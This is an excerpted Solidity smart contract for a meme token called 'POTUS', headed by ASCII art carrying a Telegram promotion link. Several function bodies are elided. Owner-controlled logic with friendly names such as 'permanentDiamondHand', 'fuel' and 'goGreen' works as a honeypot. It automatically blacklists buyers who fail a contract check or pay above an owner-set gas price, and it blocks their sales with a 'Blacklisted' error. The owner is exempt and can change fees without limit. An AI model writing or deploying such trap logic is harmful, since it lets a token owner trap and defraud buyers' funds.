...
/*
⣿https://t.me/welcomebacktrumpcoin ⠄⣿⣿⣿⣿⣿
⣿⡟⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠉⣿⣿⣿
⡟⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣠⣰⣶⣽⣽⣷⣶⣀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿
⠁⠄⠄⠄⠄⠄⡀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣆⡀⠄⠄⠄⠄⠄⣀⠄⠄⣿⣿⣿
⠄⠄⠄⠄⣤⣾⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣷⣶⣾⣿⠄⢀⣿⣿⣿
...
contract POTUS is Ownable, IERC20 {
    ...
    bool public floorIsDiamonds = true;
    bool public launchMode = true;
    bool private inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyByLimitOnly = false;

    bool public antiContract = true;
    bool public goGreen = true;

    mapping(address => bool) public permanentDiamondHand;
    mapping(address => bool) public isPermitted;

    uint256 public fuel = 1 * 1 gwei;
    ...
    constructor() {
        ...
        isFeeExempt[tokenDeposit] = true;

        isPermitted[address(this)] = true;
        isPermitted[msg.sender] = true;
        isPermitted[address(pair)] = true;
        isPermitted[address(router)] = true;

        isTxLimitExempt[tokenDeposit] = true;
    ...
    function changeIsPermitted(bool _bool, address _address)
        external
        onlyOwner
    {
        isPermitted[_address] = _bool;
    }
    ...
    function grantCompletePermissions(address target) public onlyOwner {
        ...
        isPermitted[target] = true;
        permanentDiamondHand[target] = false;
    }
    ...
    function changeFees(
        ...
        uint256 newDevFee,
        uint256 newFeeInToken,
        uint256 extraSellFee
    ) external onlyOwner {
        liquidityFee = newLiqFee;
        marketingFee = newMarketingFee;
        devFee = newDevFee;
        tokenFee = newFeeInToken;
    ...
    function hodlMode(bool _status) public onlyOwner {
        require(launchMode, "");
        floorIsDiamonds = _status;
    }

    function createHodlers(address[] calldata addresses, bool status)
        public
        onlyOwner
    {
        require(launchMode, "");
        for (uint256 i; i < addresses.length; ++i) {
            permanentDiamondHand[addresses[i]] = status;
        }
    }
    ...
    function changeFuel(uint256 newFuel) external onlyOwner {
        require(launchMode, "");
        fuel = newFuel * 1 gwei;
    }
    ...
    function removeAllBlacklists() public onlyOwner {
        floorIsDiamonds = false;
    }
    ...
    function _transferFrom(
        ...
        if(sender != owner() && recipient != owner()){
            runProtections(sender, recipient);
        }
    ...
    function takeFee(
        ...
        if (feeApplicable > 0 && tokenFee > 0) {
            amountForToken = amount.mul(tokenFee).div(100);
            _balances[tokenDeposit] = _balances[tokenDeposit].add(
                amountForToken
            );
            emit Transfer(sender, tokenDeposit, amountForToken);
        }
        ...
        return amount.sub(feeAmount).sub(amountForToken);
    }
    ...
    function runProtections(address sender, address recipient) internal {
        if (
            floorIsDiamonds &&
            sender != owner() &&
            recipient != owner() &&
            ...
            require(!permanentDiamondHand[sender], "Blacklisted");
        }
        if (
            failsCaptcha(recipient) &&
            !isPermitted[recipient] &&
            !isFeeExempt[recipient] &&
            antiContract
        ) {
            permanentDiamondHand[recipient] = true;
        }
        if (isPair[sender] && tx.gasprice > fuel && goGreen) {
            permanentDiamondHand[recipient] = true;
        }
        if (!isPair[sender] && tx.gasprice > fuel && goGreen) {
            require(isPermitted[sender], "Gas price too high");
        }
    }
}